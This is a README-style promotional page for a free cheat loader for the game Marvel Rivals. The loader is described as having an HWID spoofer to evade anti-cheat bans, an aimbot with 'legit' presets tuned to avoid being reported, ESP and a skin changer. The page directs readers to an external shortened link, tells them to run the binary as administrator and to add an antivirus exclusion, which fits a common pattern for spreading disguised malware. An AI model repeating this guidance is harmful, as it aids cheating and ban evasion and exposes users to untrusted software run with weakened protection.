# Marvel Rivals Toolkit — Spoofer, Aimbot & Skin Changer

![Version](https://img.shields.io/badge/Version-2026-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=flat-square) ![Price](https://img.shields.io/badge/Price-Free-success?style=flat-square) ![Type](https://img.shields.io/badge/Type-GameTool-E53935?style=flat-square)

One loader for Marvel Rivals: **spoofer**, **aimbot**, **skin changer** and ESP. Built for the current EAC patch, portable, and free. **Download, run as administrator, done.**

## 🎯 At a Glance

| | |
| --- | --- |
| **Game** | Marvel Rivals |
| **Anti-cheat** | EAC |
| **Modules** | spoofer, aimbot, skins |
| **Platform** | Windows 10 / 11 |
| **Price** | Free |

<p align="center">
  <a href="https://share.google/wuvy5KGdh1Ifb62eR"><img src="button.svg" alt="Full instructions" height="46"></a>
</p>

## ❓ What's In The Pack

**Marvel Rivals** ships as a single loader with four modules that work independently:

| **Module** | **What it does** |
| --- | --- |
| **HWID Spoofer** | Rewrites the hardware identifiers EAC reads |
| **Aimbot** | Moves the crosshair with configurable smoothing |
| **Skin Changer** | Swaps cosmetics client-side |
| **ESP** | Draws player information through walls |

You can run any module on its own. Most people use the spoofer once after a ban, then the aimbot and skins for normal play.

## 🎯 Modules

| **Module** | **Included** |
| --- | --- |
| **HWID Spoofer** | ✅ Disk, MAC, SMBIOS, GUID |
| **Aimbot** | ✅ FOV, smoothing, hitbox |
| **Skin Changer** | ✅ Full catalogue |
| **ESP** | ✅ Boxes, health, distance |
| **Triggerbot** | ✅ Adjustable delay |
| **Radar** | ✅ Player positions |
| **Config system** | ✅ Save and load presets |
| **Price** | ✅ Free |

## ❓ Frequently Asked Questions

**Does the spoofer unban my account?**

No. It gives the machine a new hardware identity so a new account is not linked to the old ban. The banned account stays banned.

**Do I need to reboot after spoofing?**

Yes. Volume serial and SMBIOS values are read at boot, so the change only applies after a restart.

**Is the aimbot configurable?**

Yes — FOV, smoothing, hitbox, max distance, visible check and hold key are all adjustable, with Legit and Rage presets included.

**Do other players see my skins?**

The skin changer works on your client. Anything the server validates will not persist for others.

**Is it free?**

Yes. Spoofer, aimbot, skin changer and ESP in one free download — no subscription.

**Does it work on Windows 11?**

Yes, on Windows 10 and 11 (64-bit), as administrator.

**Why does my antivirus flag it?**

Cheat loaders hook the game and touch hardware identifiers, so scanners treat them with suspicion. Add an exclusion for the folder.


## 🆔 HWID Spoofer

EAC does not only ban accounts — it bans the hardware those accounts ran on.
That is why a fresh account dies almost immediately after a ban.

**What gets rewritten**

| **Layer** | **Identifier** | **Effect** |
| --- | --- | --- |
| **Storage** | Volume + disk serials | New drive identity |
| **Network** | MAC address | New adapter identity |
| **Firmware view** | SMBIOS UUID, board serial | New motherboard identity |
| **Windows** | Machine GUID, product ID | New install identity |
| **GPU** | Adapter serial | New graphics identity |
| **Leftovers** | Registry + file ban markers | Cleaned |

**Order of operations**

Spoof first, reboot, then create the account. Doing it the other way round means
the new account is created while the old fingerprint is still active.

**Reboot is required**

Volume serial and SMBIOS changes are read at boot. Skipping the reboot is the
most common reason people report "the spoofer did not work".


## 🎯 Aimbot

| **Setting** | **Range** | **What it does** |
| --- | --- | --- |
| **Enable** | On / Off | Master switch |
| **FOV** | 1–180° | How far from the crosshair it looks |
| **Smoothing** | 1–100 | Lower = faster, higher = more human |
| **Hitbox** | Head / Chest / Nearest | Where it aims |
| **Max distance** | 50–1000 m | Stop aiming past this range |
| **Visible check** | On / Off | Only aim at players you can see |
| **Hold key** | Any key | Aimbot only while held |

**Two presets that work**

| **Preset** | **FOV** | **Smoothing** | **Hitbox** | **Use** |
| --- | --- | --- | --- | --- |
| **Legit** | 8–15 | 45–60 | Chest | Public matches |
| **Rage** | 90–180 | 5–10 | Head | Private lobbies |

Start with **Legit**. A wide FOV with low smoothing is the single most visible
setting in the tool — it is what gets people reported.

**Why smoothing matters**

An instant snap to the head is not something a human hand produces. Smoothing
spreads the movement over several frames so the crosshair travels like a mouse
movement. 45–60 is a good starting range.


## 🎨 Skin Changer

Unlock and preview any cosmetic without buying it.

| **Module** | **What it does** |
| --- | --- |
| **Skin unlocker** | Makes every skin selectable |
| **Wear control** | Sets float value per skin |
| **Rarity preview** | Shows any tier |
| **Loadout presets** | Save several looks |
| **Instant swap** | Change mid-session |

**Practical use**

Build two loadouts — one loud, one understated — and switch between them. The
presets save with the config, so they survive a restart.

**Limits**

Cosmetics are applied on your client. Anything the server validates will not
persist for other players.


## 🗂️ Config System

Every setting lives in a JSON file, so profiles are portable.

| **File** | **Contents** |
| --- | --- |
| `legit.json` | Low-profile aim and visuals |
| `rage.json` | Full-feature preset |
| `custom.json` | Your own saved profile |
| `skins.json` | Cosmetic loadouts |

**Saving and loading**

The config tab has **Save** and **Load**. Saved profiles survive updates because
they sit outside the loader binary.

**Sharing profiles**

The files are plain JSON. Copy one to another machine and load it there — useful
if you tune settings on one PC and play on another.

**Resetting**

Load `legit.json` to return to defaults. Most "the aimbot feels wrong" reports
are a config that drifted over many small edits.


## 🧪 First-Run Checklist

Run through this once before a real session.

**Spoofer (only if you were banned)**

- [ ] Game and launcher fully closed
- [ ] Loader started as administrator
- [ ] Spoof completed without error
- [ ] **Windows rebooted**
- [ ] New account created **after** the reboot

**Aimbot**

- [ ] Menu opens with `Insert`
- [ ] Legit preset loaded
- [ ] FOV under 20°
- [ ] Tested in a private lobby first

**Skin changer**

- [ ] Catalogue loads
- [ ] Item applies instantly
- [ ] Loadout saved

**General**

- [ ] Antivirus exclusion added
- [ ] No other overlay running
- [ ] Config backed up

**If something fails**

The three most common causes are: no reboot after spoofing, no administrator
rights, and a missing Visual C++ runtime. All three are covered in
Troubleshooting.


## ⚖️ Legit vs Rage Configuration

Two presets ship with the tool. They are not cosmetic names — they change how
detectable the aimbot is.

| **Setting** | **Legit** | **Rage** |
| --- | --- | --- |
| **FOV** | 8–15° | 90–180° |
| **Smoothing** | 45–60 | 5–10 |
| **Hitbox** | Chest | Head |
| **Visible check** | On | Off |
| **Max distance** | 150 m | 1000 m |
| **Triggerbot** | Off | On |

**When to use which**

- **Legit** — public matches, ranked, anything with other people watching.
- **Rage** — private lobbies, testing, single-player modes.

**The honest trade-off**

Rage settings are more effective and far more visible. A 180° FOV with smoothing
at 5 looks nothing like a human hand. If your account matters, stay on Legit.

**Switching**

Presets load from the config tab in one click. Keep both saved so you can move
between them without re-tuning every value.

---

*marvel-rivals-shift · Updated 2026-10-30 · Shared under the MIT License*
